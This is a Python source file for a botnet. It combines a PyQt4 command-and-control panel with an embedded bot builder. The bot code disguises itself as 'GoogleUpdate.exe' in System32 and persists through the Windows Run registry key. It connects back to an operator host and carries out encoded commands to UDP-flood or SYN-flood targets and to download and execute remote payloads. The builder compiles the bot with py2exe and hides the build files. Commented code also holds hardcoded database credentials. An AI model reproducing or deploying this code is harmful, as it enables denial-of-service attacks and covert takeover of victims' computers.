import sys
import threading
import socket
import string
import time
import random
import urllib
import os
import shutil
from PyQt4 import QtCore, QtGui
from controlui import Ui_Dialog
import MySQLdb as mdb

def enc(s,k) :
    fs = "";
    ka = 0;
    for i in range(0,len(s)) :
        fs += chr(int(ord(str(s[i]))-10+(ord(str(k[ka]))-35+(i%20-len(s)%20))))
        ka+=1;
        ka%=len(k);
    return fs;
def dec(s,k) :
    fs = "";
    ka = 0;
    for i in range(0,len(s)) :
        fs += chr(int(ord(str(s[i]))+10-(ord(str(k[ka]))-35+(i%20-len(s)%20))))
        ka+=1;
        ka%=len(k);
    return fs;

class StartQT4(QtGui.QMainWindow):
    def __init__(self, parent=None):
        QtGui.QWidget.__init__(self, parent)
        self.ui = Ui_Dialog()
        self.ui.setupUi(self)
        self.ui.tabWidget.setTabEnabled(1, False)
        self.ui.tabWidget.setTabEnabled(2, False)
        self.ui.tabWidget.setTabEnabled(3, False)
        self.ui.userBox.setFocus()
        self.connect(self, QtCore.SIGNAL('triggered()'), self.closeEvent)
    def closeEvent(self, event):
        self.sClose()
    def sClose(self):
        print 'Close Event'
        t.stopMe()
        tt.stopMe()
        a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        a.connect(('127.0.0.1', 8888))
        for s in l:
            try:
                cmd = enc('closed', key)
                s[0].send(cmd)
            except:
                print 'Some bot(s) failed command recieve'
        self.close()
    def sLogin(self):
##        user = self.ui.userBox.text()
##        gpw = self.ui.pwBox.text()
##        try:
##            conn = mdb.connect('184.168.194.11','goldenboy',
##                               'P@ssw0rd','goldenboy')
##            cursor = conn.cursor()
##            cursor.execute("SELECT Password FROM Users WHERE Username = '" + str(user) + "';")
##            data = cursor.fetchone()
##            if str(data) != "None":
##                if str(data[0]) == gpw:
##                    t.start()
##                    tt.start()
##                    self.ui.tabWidget.setTabEnabled(1, True)
##                    self.ui.tabWidget.setTabEnabled(2, True)
##                    self.ui.tabWidget.setTabEnabled(3, True)
##                    self.ui.tabWidget.setTabEnabled(0, False)
##                else:
##                    self.close()
##            else:
##                self.close()
##        except mdb.Error, e:
##            print "Error %d: %s" % (e.args[0],e.args[1])
        t.start()
        tt.start()
        self.ui.tabWidget.setTabEnabled(1, True)
        self.ui.tabWidget.setTabEnabled(2, True)
        self.ui.tabWidget.setTabEnabled(3, True)
        self.ui.tabWidget.setTabEnabled(0, False)
            
    def Output(self, txt):
        self.ui.output.setText(QtGui.QApplication.translate("Dialog", txt, None, QtGui.QApplication.UnicodeUTF8))
    def sGo(self):
        st = self.ui.comboBox.currentText()
        if st == "Update List":
            self.sListUpdate()
        elif st == "DDOS":
            self.sDDOS()
        elif st == "SynFlood":
            self.sSYNFLOOD()
        elif st == "Get":
            self.sGET()
        elif st == "Update Bot":
            self.BotUpdate()
        elif st == "Run":
            self.sRun()
        elif st == "Vaccinate":
            self.sVaccinate()
    def sDDOS(self):
        h = self.ui.argsBox.text()
        if h == 'help':
            self.ui.argsBox.setText("<ip> <port> <time-in-seconds>")
            self.Output("How to DDOS")
            return
        self.Output("DDOSing")
        args = self.ui.argsBox.text()
        args = args.split(" ")
        flag = True
        for st in args:
            if st == "":
                flag = False
        for s in l:
            try:
                if flag:
                    cmd = enc('ddos ' + args[0] + ' ' + args[1] + ' ' + args[2], key)
                    s[0].send(cmd)
                    s[3] = "DDOSing..."
                    #secs = int(args[2])
                    #wait.start()
                    wait = threading.Thread(target=Wait, args=(int(args[2]), ))
                    wait.start()
                    self.sListUpdate()
                    self.ui.argsBox.clear()
                else:
                    self.Output("Insufficient Arguments")
            except:
                self.Output("Insufficient Arguments")
    def sSYNFLOOD(self):
        h = self.ui.argsBox.text()
        if h == 'help':
            self.ui.argsBox.setText("<ip> <port> <time-in-seconds>")
            self.Output("How to SynFlood")
            return
        self.Output("Syn Flooding")
        args = self.ui.argsBox.text()
        args = args.split(" ")
        flag = True
        for st in args:
            if st == "":
                flag = False
        for s in l:
            try:
                if flag:
                    cmd = enc('synflood ' + args[0] + ' ' + args[1] + ' ' + args[2], key)
                    s[0].send(cmd)
                    s[3] = "SynFlooding..."
                    #secs = int(args[2])
                    #wait.Start()
                    wait = threading.Thread(target=Wait, args=(int(args[2]), ))
                    wait.start()
                    self.sListUpdate()
                    self.ui.argsBox.clear()
                else:
                    self.Output("Insufficient Arguments")
            except:
                self.Output("Insufficient Arguments")
    def sGET(self):
        h = self.ui.argsBox.text()
        if h == 'help':
            self.ui.argsBox.setText("<url> <save-file-path> <1/0 run/justSave>")
            self.Output("How to Get")
            return
        self.Output("Getting from Internet")
        args = self.ui.argsBox.text()
        args = args.split(" ")
        flag = True
        for st in args:
            if st == "":
                flag = False
        for s in l:
            try:
                if flag:
                    cmd = enc('get ' + args[0] + ' ' + args[1] + ' ' + args[2], key)
                    s[0].send(cmd)
                    s[3] = "Getting..."
                    self.sListUpdate()
                    s[3] = "Idle"
                    self.ui.argsBox.clear()
                else:
                    self.Output("Insufficient Arguments")
            except:
                self.Output("Insufficient Arguments")
    def sListUpdate(self):
        h = self.ui.argsBox.text()
        if h == 'help':
            self.ui.argsBox.setText("")
            self.Output("No Arguments Needed")
            return
        #self.Output("Updating List")
        self.ui.argsBox.setText("")
        self.ui.list.clear()
        ll = []
        for obj in l:
            ll.append(str(obj[1][0]) + " / " + str(obj[2]) + "\t        " + str(obj[3]))
##            try:
##                ll.append(str(obj[2]))
##            except:
##                ll.append(str(obj[1][0]))
##        self.ui.numBots.display(int(len(l)))
        self.ui.list.addItems(ll)
    def sBotUpdate(self):
        h = self.ui.argsBox.text()
        if h == 'help':
            self.ui.argsBox.setText("<url> <save-file-path>")
            self.Output("How to Update Bots")
            return
        self.Output("Updating Bot")
        args = self.ui.argsBox.text()
        args = args.split(" ")
        flag = True
        for st in args:
            if st == "":
                flag = False
        for s in l:
            try:
                if flag:
                    cmd = enc('update ' + args[0] + ' ' + args[1], key)
                    s[0].send(cmd)
                    s[3] = "Updating..."
                    self.sListUpdate()
                    s[3] = "Idle"
                    self.ui.argsBox.clear()
                else:
                    self.Output("Insufficient Arguments")
            except:
                self.Output("Insufficient Arguments")
    def sRun(self):
        h = self.ui.argsBox.text()
        if h == 'help':
            self.ui.argsBox.setText("<file-path-to-run>")
            self.Output("How to Run")
            return
        self.Output("Running")
        args = self.ui.argsBox.text()
        args = args.split(" ")
        flag = True
        for st in args:
            if st == "":
                flag = False
        for s in l:
            try:
                if flag:
                    cmd = enc('run ' + args[0], key)
                    s[0].send(cmd)
                    s[3] = "Running File..."
                    self.sListUpdate()
                    s[3] = "Idle"
                    self.ui.argsBox.clear()
                else:
                    self.Output("Insufficient Arguments")
            except:
                self.Output("Insufficient Arguments")
    def sVaccinate(self):
        h = self.ui.argsBox.text()
        if h == 'help':
            self.ui.argsBox.setText("Select Bot to Vaccinate, or Deselect to Vaccinate All")
            self.Output("How to Vaccinate")
            return
        self.Output("Vaccinating")
        try:
            i = self.ui.list.currentRow()
            if self.ui.list.isItemSelected(self.ui.list.item(i)):
                cmd = enc('clean', key)
                l[i][0].send(cmd)
                l[i][3] = "Vaccinating..."
                self.sListUpdate()
            else:
                for s in l:
                    cmd = enc('clean', key)
                    s[0].send(cmd)
                    s[3] = "Vaccinating..."
                    self.sListUpdate()
                self.Output("Vaccinating all Bots")
        except:
            self.Output("Failed to send command")
    def sInfo(self):
        h = self.ui.argsBox.text()
        if h == 'help':
            self.ui.argsBox.setText("")
            self.Output("No Arguments Needed")
            return
        self.Output("Getting Info")
        for s in l:
            cmd = enc('info', key)
            s[0].send(cmd)
            thing = s[0].recv(10000000)
            try:
                test = str(s[2])
            except:
                s.append(thing)
        self.sListUpdate()
    def sBuild(self):
        ip = self.ui.ipBox.text()
        mutex = self.ui.mutexBox.text()
        if ip == '':
            return
        if mutex == '':
            return
        servSource = open('serv.py', 'w')
        servSource.write(scr1)
        servSource.write("HOST = '" + ip + "'\nMUTEX = '" + mutex + "'")
        servSource.write(scr2)
        servSource.close()
        compSource = open('comp.bat', 'w')
        compSource.write("color 0a\nC:/Python27/python setup.py py2exe")
        compSource.close()
        setupSource = open('setup.py', 'w')
        setupSt = """from distutils.core import setup
import py2exe, sys, os

sys.argv.append('py2exe')

excludes = ["Secur32.dll", "SHFOLDER.dll"]
setup(
    options = {
        "py2exe": {
            "compressed": 1,
            "optimize": 2,
            "ascii": 1,
            "bundle_files": 1,
            "dll_excludes": excludes,
            "packages": ["encodings"],
            "dist_dir": "dist"
            }
        },
    windows = [{'script': "serv.py"}],
    zipfile = None,
    console=[{"script": "serv.py"}]
    )"""
        setupSource.write(setupSt)
        setupSource.close()
        p = os.popen('attrib +h +s comp.bat')
        p = os.popen('attrib +h +s serv.py')
        p = os.popen('attrib +h +s setup.py')
        lol = threading.Thread(target=BuildWait)
        lol.start()
        os.system('comp.bat')
        #self.ui.outputURLChecker.setText(QtGui.QApplication.translate("Dialog", "Finished Building", None, QtGui.QApplication.UnicodeUTF8))
        os.remove('comp.bat')
        os.remove('serv.py')
        os.remove('setup.py')
        shutil.copy('dist\\serv.exe', 'serv.exe')
        shutil.rmtree('dist')
        shutil.rmtree('build')
            
    def sRanMutex(self):
        ran = ''
        random.seed()
        r = []
        for i in range(65, 91):
            r.append(chr(i))
        for i in range(48, 58):
            r.append(chr(i))
        for i in range(97, 123):
            r.append(chr(i))
        for i in range(25):
            ran = ran + str(r[random.randint(0, len(r)-1)])
        self.ui.mutexBox.setText(ran)
    def sCheckURL(self):
        url = self.ui.URLBox.text()
        if url == "":
            self.ui.outputURLChecker.setText(QtGui.QApplication.translate("Dialog", "Please enter URL", None, QtGui.QApplication.UnicodeUTF8))
            return
        self.ui.URLBox.setText("")
        obj = urllib.urlopen("http://www.downforeveryoneorjustme.com/" + str(url))
        source = obj.read()
        if source.find("looks down from here.") != -1:
            self.ui.outputURLChecker.setText(QtGui.QApplication.translate("Dialog", str(url) + " is down.", None, QtGui.QApplication.UnicodeUTF8))
        else:
            self.ui.outputURLChecker.setText(QtGui.QApplication.translate("Dialog", str(url) + " is up.", None, QtGui.QApplication.UnicodeUTF8))

class GetConnections ( threading.Thread ):
    def run ( self ):
        self.running = True
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	host = ''
	port = 8888
	s.bind((host, port))
	s.listen(5)
	myapp.ui.output.setText(QtGui.QApplication.translate("Dialog", "Awaiting Connections", None, QtGui.QApplication.UnicodeUTF8))
	count = 0
	while self.running:
            conn, addr = s.accept()
            info = ''
            info = conn.recv(10000)
            if self.running == False:
                continue
            botMutex = ''
            botMutex = conn.recv(1000000)
            myapp.ui.output.setText(QtGui.QApplication.translate("Dialog", "Bot " + str(addr[0]) + " has joined", None, QtGui.QApplication.UnicodeUTF8))
            found = False
            l.append([conn, addr, info, "Idle"])
            myapp.sListUpdate()
##            if len(l) == 0:
##                l.append([conn, addr, info, "Idle", botMutex])
##                myapp.sListUpdate()
##            else:
##                for p in l:
##                    if found == False:
##                        if botMutex == p[4]:
##                            cmd = enc('clean', key)
##                            conn.send(cmd)
##                            found = True
##                if found == False:
##                    l.append([conn, addr, info, "Idle", botMutex])
##                    myapp.sListUpdate()

    def stopMe(self):
        self.running = False

class HeartBeat ( threading.Thread ):
    def run ( self ):
        self.running = True
        while self.running:
            for s in l:
                try:
                    #print "Pinging"
                    toSend = enc("ping", key)
                    s[0].send(toSend)
                    #task = s[0].recv(10000)
                    #s[3] = task
                    #print str(s[3])
                    #myapp.sListUpdate()
                except:
                    l.remove(s)
                    myapp.sListUpdate()
            time.sleep(2)

    def stopMe(self):
        self.running = False

##class Wait ( threading.Thread ):
##    def run ( self ):
##        time.sleep(secs)
##        for s in l:
##            s[3] = "Idle"
##        myapp.sListUpdate()
def Wait(seconds):
    #time.sleep(seconds*1.15)
    for s in l:
        try:
            task = s[0].recv(1000)
            s[3] = "Idle"
        except:
            s[3] = "Idle"
    myapp.sListUpdate()

def BuildWait():
    while os.path.isdir('build') == False:
        time.sleep(0.01)
    p = os.popen('attrib +h build')
    while os.path.isdir('dist') == False:
        time.sleep(0.01)
    p = os.popen('attrib +h dist')
    
if __name__ == "__main__":
    global l, t, tt, myapp, key, secs, wait, scr1, scr2
    secs = 2
    key = "this is the best key in the world, you'll never guess it :D 4&#*%:J"
    l = []
    t = GetConnections()
    tt = HeartBeat()
    app = QtGui.QApplication(sys.argv)
    scr1 = """from _winreg import *
import sys
import socket
import string
import time
import threading
import os
import os.path
import shutil
import platform
import urllib2
import random

def enc(s,k) :
    fs = "";
    ka = 0;
    for i in range(0,len(s)) :
        fs += chr(int(ord(s[i])-10+(ord(k[ka])-35+(i%20-len(s)%20))))
        ka+=1;
        ka%=len(k);
    return fs;
def dec(s,k) :
    fs = "";
    ka = 0;
    for i in range(0,len(s)) :
        fs += chr(int(ord(s[i])+10-(ord(k[ka])-35+(i%20-len(s)%20))))
        ka+=1;
        ka%=len(k);
    return fs;

global cmd
global d
global s
global key
global outfile
global q
global f
global ip
global mutex

class Infect(threading.Thread):
    def run(self):
        shutil.copy(sys.argv[0],outfile)
        aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
        aKey = OpenKey(aReg, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE)
        SetValueEx(aKey,"Explorer",0, REG_SZ, outfile)

class DDOS ( threading.Thread ):
    def run ( self ):
        self.running = True
        target = (cmd[1],cmd[2]);
        soc = socket.socket(socket.AF_INET,socket.SOCK_DGRAM);
        random.seed()
        d = random.random()
        while self.running:
            for x in range(1000):
                soc.sendto(str(d),target);
        s.send("Done")
        print 'Finished DDOSing'

    def stopMe ( self ):
        self.running = False

class Synflood(threading.Thread):
    def run(self):
        self.running = True
        target = (cmd[1],cmd[2])
        while self.running:
            synsock = socket.socket()
            synsock.connect(target)
        s.send("Done")
        print 'Finished SYNFlooding'

    def stopMe ( self ):
        self.running = False

class WaitDDOS ( threading.Thread ):
    def run ( self ):
        time.sleep(cmd[3])
        d.stopMe()
        
class WaitSYN ( threading.Thread ):
    def run ( self ):
        time.sleep(cmd[3])
        q.stopMe()

def Get():
    wget = cmd[1]
    wgetsave = cmd[2]
    try:
        file2down = urllib2.urlopen(wget)
        output = open(wgetsave, 'wb')
        output.write(file2down.read())
        output.close()
        if cmd[0] == 'get':
            if cmd[3] == 1:
                os.popen3(wgetsave)
        elif cmd[0] == 'update':
            os.popen3(wgetsave)
            print 'Closing in 1 second:'
            time.sleep(1)
            sys.exit()
    except:
        print "Failed to 'GET\\UPDATE'"

#HOST = 'r0otaccess.hopto.org'
#-------------------------------
"""
    scr2 = """
PORT = 8888
#-------------------------------
key = "this is the best key in the world, you'll never guess it :D 4&#*%:J"
bigFlag = True
outfile = os.getcwd()[0]
outfile = outfile + ":\\Windows\\System32\\GoogleUpdate.exe"

if os.path.isfile(outfile) == False:
    Infect().start()
else:
    print "\\nComputer is already infected"

while bigFlag:
    bigFlag = False
    connFlag = True
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while connFlag:
        try:
            s.connect((HOST, PORT))
#            s.send(platform.node() + " - " + platform.system() + " " + platform.uname()[2])
            s.send(platform.system() + " " + platform.uname()[2])
            s.send(MUTEX)
            connFlag = False
        except:
            print "Trying to connect again in 2 second"
        time.sleep(2)

    flag = True
    while flag:
        try:
            #print "Waiting for Command"
            cmd = s.recv(10000)
            #print "Received Command"
            cmd = dec(cmd, key)
            cmd = cmd.split(" ")
            if cmd[0] == 'test':
                print "Test command recieved successfully :)"
##            elif cmd[0] == 'ping':
##                print "PINGed"
##                if d.isAlive():
##                    s.send("DDOSing " + ip)
##                elif q.isAlive():
##                    s.send("SynFlooding " + ip)
##                else:
##                    s.send("Idle")
            elif cmd[0] == 'ddos':
                ip = cmd[1]
                cmd[2] = int(cmd[2])
                cmd[3] = int(cmd[3])
                print "DDOSing " + str(cmd[1]) + " on port " + str(cmd[2])
                d = DDOS()
                w = WaitDDOS()
                w.start()
                d.start()
            elif cmd[0] == 'synflood':
                ip = cmd[1]
                cmd[2] = int(cmd[2])
                cmd[3] = int(cmd[3])
                print "SYNFlooding " + str(cmd[1]) + " on port " + str(cmd[2])
                q = Synflood()
                f = WaitSYN()
                f.start()
                q.start()
            elif cmd[0] == 'run':
                try:
                    file2run = cmd[1]
                    if os.path.isfile(file2run) == True:
                        os.popen3(file2run)
                        print "Running " + str(cmd[1])
                    elif os.path.isfile(file2run) == False:
                        print "File not found"
                except:
                    print "An Error Occured Running your File"
                
            elif cmd[0] == 'get' or cmd[0] == 'update':
                if cmd[0] == 'get':
                    cmd[3] = int(cmd[3])
                    print "Getting " + str(cmd[1]) + " and saving as " + str(cmd[2])
                else:
                    print "Updating to " + str(cmd[1])
                Get()
            elif cmd[0] == 'clean':
                flag = False
                aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
                aKey = OpenKey(aReg, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE)
                try:
                    DeleteValue(aKey, "Explorer")
                    os.remove(outfile)
                    print "Cleaned: 1 second"
                except:
                    print "Cleaned: 1 second"
                time.sleep(1)
            elif cmd[0] == 'info':
                s.send(platform.node() + " - " + platform.system() + " " + platform.uname()[2])
            elif cmd[0] == 'closed':
                flag = False
                bigFlag = True
        except:
            flag = False
            bigFlag = True
"""
    myapp = StartQT4()
    myapp.show()
    sys.exit(app.exec_())
